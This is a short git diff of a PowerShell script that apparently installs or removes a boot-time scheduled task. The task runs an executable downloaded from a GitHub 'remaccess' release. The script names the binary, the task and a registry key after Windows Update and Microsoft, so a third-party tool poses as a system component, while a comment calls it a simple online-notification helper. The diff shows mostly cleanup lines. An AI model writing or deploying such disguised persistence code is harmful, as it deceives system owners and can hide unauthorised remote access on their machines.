@@ -1,7 +1,7 @@
 #This script creates a schedule task that will run everytime the system is booted up.
 #Purpose of this scirpt to get notified once a system comes online.
-$filepath = "C:\Windows\System32\WindowsUpdateServiceDaemon.ps1"
 $localFilePath = "C:\Windows\System32\WindowsUpdateServiceDaemon.exe"
+$filePaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe","C:\Windows\System32\WindowsUpdateServiceDaemon.exe")
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/WindowsDiscordPingStatus.exe"
 $pingdaemontask = "Windows Update Service Daemon"
 $regPath = "HKLM:\SOFTWARE\Microsoft\MicrosoftUpdateServiceDaemon"
@@ -21,7 +21,7 @@ foreach ($file in $filepath) {
     if (Test-Path $file -PathType Leaf) {
         Remove-Item -Path $file -Force
     } else {}
-	}
+}
 #Removing Registry Keys
 if (Test-Path $regPath) {
     Remove-Item -Path $regPath -Recurse -Force
